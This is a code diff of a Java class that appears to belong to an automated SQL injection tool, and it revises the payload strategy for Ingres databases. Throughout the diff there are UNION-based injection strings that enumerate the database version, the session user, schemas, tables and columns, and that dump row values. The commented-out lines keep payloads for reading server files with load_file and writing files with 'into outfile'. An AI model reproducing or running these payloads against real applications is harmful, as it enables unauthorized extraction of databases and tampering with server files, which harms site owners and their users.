@@ -15,83 +15,100 @@ public class IngresStrategy implements ISQLStrategy {
     @Override
     public String getSchemaInfos() {
         return 
-            "SELECT+hex(dbmsinfo('_version')||'{%}'||dbmsinfo('database')||'{%}'||dbmsinfo('session_user')||'{%}'||dbmsinfo('session_user'))||'i'r";
+            "SELECT+dbmsinfo('_version')||'{%}'||dbmsinfo('database')||'{%}'||dbmsinfo('session_user')||'{%}'||dbmsinfo('session_user')||0x01030307+r";
     }
 
     @Override
     public String getSchemaList() {
         return 
-            "select+rr||if(c>=nb,'i','')||'i'r+from(select+'hh'||hex(trim(t.schema_name))||'jj30hh'rr,count(*)c+" +
+            "select+rr||0x01030307+r+from(select+0x04||trim(t.schema_name)||'%050%04'rr+" +
             "from(select+distinct+schema_name+from+iischema)t,(select+distinct+schema_name+from+iischema)t1+" +
             "where+t.schema_name>=t1.schema_name+" +
-            "group+by+1{limit})a,(select+count(distinct+schema_name)nb+from+iischema)y";
+            "group+by+1{limit})a";
+//        "select+rr||if(c>=nb,'i','')||'i'r+from(select+'hh'||hex(trim(t.schema_name))||'jj30hh'rr,count(*)c+" +
+//        "from(select+distinct+schema_name+from+iischema)t,(select+distinct+schema_name+from+iischema)t1+" +
+//        "where+t.schema_name>=t1.schema_name+" +
+//        "group+by+1{limit})a,(select+count(distinct+schema_name)nb+from+iischema)y";
     }
 
     @Override
     public String getTableList(Database database) {
         return 
-            "select+rr||if(c>=nb,'i','')||'i'r+from(select+'hh'||hex(trim(t.table_name))||'jj30hh'rr,count(*)c+" +
+            "select+rr||0x01030307+r+from(select+0x04||trim(t.table_name)||'%050%04'rr+" +
             "from(select+distinct+table_name+from+iiingres_tables+where+table_owner='" + database + "')t,(select+distinct+table_name+from+iiingres_tables+where+table_owner='" + database + "')t1+" +
             "where+t.table_name>=t1.table_name+" +
-            "group+by+1{limit})a,(select+count(distinct+table_name)nb+from+iiingres_tables+where+table_owner='" + database + "')y";
+            "group+by+1{limit})a";
+//        "select+rr||if(c>=nb,'i','')||'i'r+from(select+'hh'||hex(trim(t.table_name))||'jj30hh'rr,count(*)c+" +
+//        "from(select+distinct+table_name+from+iiingres_tables+where+table_owner='" + database + "')t,(select+distinct+table_name+from+iiingres_tables+where+table_owner='" + database + "')t1+" +
+//        "where+t.table_name>=t1.table_name+" +
+//        "group+by+1{limit})a,(select+count(distinct+table_name)nb+from+iiingres_tables+where+table_owner='" + database + "')y";
     }
 
     @Override
     public String getColumnList(Table table) {
         return 
-            "select+rr||if(c>=nb,'i','')||'i'r+from(select+'hh'||hex(trim(t.column_name))||'jj30hh'rr,count(*)c+" +
+            "select+rr||0x01030307+r+from(select+0x04||trim(t.column_name)||'%050%04'rr+" +
             "from(select+distinct+column_name+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')t,(select+distinct+column_name+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')t1+" +
             "where+t.column_name>=t1.column_name+" +
-            "group+by+1{limit})a,(select+count(distinct+column_name)nb+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')y";
+            "group+by+1{limit})a";
+//        "select+rr||if(c>=nb,'i','')||'i'r+from(select+'hh'||hex(trim(t.column_name))||'jj30hh'rr,count(*)c+" +
+//        "from(select+distinct+column_name+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')t,(select+distinct+column_name+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')t1+" +
+//        "where+t.column_name>=t1.column_name+" +
+//        "group+by+1{limit})a,(select+count(distinct+column_name)nb+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')y";
     }
 
     @Override
     public String getValues(String[] columns, Database database, Table table) {
         String formatListColumn = ToolsString.join(columns, "{%}");
         
-        formatListColumn = formatListColumn.replace("{%}", "),''))||UNHEX('7f')||trim(ifnull(varchar(");
+        formatListColumn = formatListColumn.replace("{%}", "),''))||0x7f||trim(ifnull(varchar(");
         formatListColumn = "trim(ifnull(varchar(" + formatListColumn + "),''))";
 
         return 
-            "select+rr||if(c>=nb,'i','')||'i'r+from(select+'hh'||hex(trim(t.s))||'jj30hh'rr,count(*)c+" +
+            "select+rr||0x01030307+r+from(select+0x04||trim(t.s)||'%050%04'rr+" +
             "from(select+distinct+" + formatListColumn +"s+from+\"" + database + "\"." + table + ")t,(select+distinct+" + formatListColumn + "+s+from+\"" + database + "\"." + table + ")t1+" +
             "where+t.s>=t1.s+" +
-            "group+by+1{limit})a,(select+count(distinct+" + formatListColumn + ")nb+from+\"" + database + "\"." + table + ")y";
+            "group+by+1{limit})a";
+//        "select+rr||if(c>=nb,'i','')||'i'r+from(select+'hh'||hex(trim(t.s))||'jj30hh'rr,count(*)c+" +
+//        "from(select+distinct+" + formatListColumn +"s+from+\"" + database + "\"." + table + ")t,(select+distinct+" + formatListColumn + "+s+from+\"" + database + "\"." + table + ")t1+" +
+//        "where+t.s>=t1.s+" +
+//        "group+by+1{limit})a,(select+count(distinct+" + formatListColumn + ")nb+from+\"" + database + "\"." + table + ")y";
     }
 
     @Override
     public String getPrivilege() {
-        return 
-            "concat(" +
-                "(" +
-                    "select+" +
-                        "hex(" +
-                            "if(count(*)=1,0x" + ToolsString.strhex("true") + ",0x" + ToolsString.strhex("false") + ")" +
-                        ")" +
-                    "from+INFORMATION_SCHEMA.USER_PRIVILEGES+" +
-                    "where+" +
-                        "grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)" +
-                        "and+PRIVILEGE_TYPE=0x46494c45" +
-                ")," +
-                "0x69" +
-            ")";
+        return "";
+//            "concat(" +
+//                "(" +
+//                    "select+" +
+//                        "hex(" +
+//                            "if(count(*)=1,0x" + ToolsString.strhex("true") + ",0x" + ToolsString.strhex("false") + ")" +
+//                        ")" +
+//                    "from+INFORMATION_SCHEMA.USER_PRIVILEGES+" +
+//                    "where+" +
+//                        "grantee=concat(0x27,replace(cast(current_user+as+char),0x40,0x274027),0x27)" +
+//                        "and+PRIVILEGE_TYPE=0x46494c45" +
+//                ")," +
+//                "0x69" +
+//            ")";
     }
 
     @Override
     public String readTextFile(String filePath) {
-        return "concat(hex(load_file(0x" + ToolsString.strhex(filePath) + ")),0x69)";
+        return "";
+//        return "concat(hex(load_file(0x" + ToolsString.strhex(filePath) + ")),0x69)";
     }
 
     @Override
     public String writeTextFile(String content, String filePath) {
-        return 
-            MediatorModel.model().initialQuery
-                .replaceAll(
-                    "1337" + MediatorModel.model().visibleIndex + "7331",
-                    "(select+0x" + ToolsString.strhex(content) + ")"
-                )
-                .replaceAll("--++", "")
-                + "+into+outfile+\"" + filePath + "\"--+";
+        return "";
+//            MediatorModel.model().initialQuery
+//                .replaceAll(
+//                    "1337" + MediatorModel.model().visibleIndex + "7331",
+//                    "(select+0x" + ToolsString.strhex(content) + ")"
+//                )
+//                .replaceAll("--++", "")
+//                + "+into+outfile+\"" + filePath + "\"--+";
     }
 
     @Override
@@ -223,7 +240,7 @@ public class IngresStrategy implements ISQLStrategy {
         return 
             MediatorModel.model().initialQuery.replaceAll(
                 "1337(" + ToolsString.join(indexes, "|") + ")7331",
-                "(select'SQLi'||$1,RPAD('@',1024,'@')||'iLQS')"
+                "'SQLi$1'||rpad('%23',1024,'%23')||'iLQS'"
             );
     }
 
@@ -235,7 +252,7 @@ public class IngresStrategy implements ISQLStrategy {
             fields.add("*");
             replaceTag = "select+1337"+ i +"7330%2b1";
         }
-        return "+union+select" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "from(" + replaceTag + ")b+";
+        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "+from(" + replaceTag + ")b+";
     }
 
     @Override
